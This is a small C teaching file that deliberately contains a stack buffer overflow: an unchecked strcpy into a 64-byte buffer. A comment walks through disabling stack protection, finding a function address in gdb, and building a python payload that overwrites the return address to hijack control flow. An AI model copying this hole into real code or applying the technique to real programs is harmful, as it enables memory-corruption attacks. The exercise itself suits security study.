#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef char* string;

void print_hello(){
    printf("hello, you hijacked control flow\n");
    exit(0);
}

void foo(string input){
    char buffer[64];
    strcpy(buffer,input);
}

int main(int argc, char* argv[]){
    if(argc>1){
        foo(argv[1]);
    } else{
        printf("give an argument");
    }

    return 0;
}

//gcc -fno-stack-protector -no-pie -0 v2 v2.c
/* 
    target is to get the print_hello to execute from the buffer over flow
    SO we will use gdb to find the adress
    gdb v2 // gdb wor with this file
    (gdb) print print_hello //and we will get the address

    now that we have the address we will PUD using a python script
    so in bash:

    python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 72 + b"\x96\x11\x40\x00\x00\x00\x00\x00")' > payload
    and run ./v2 $(cat payload)"./"

*/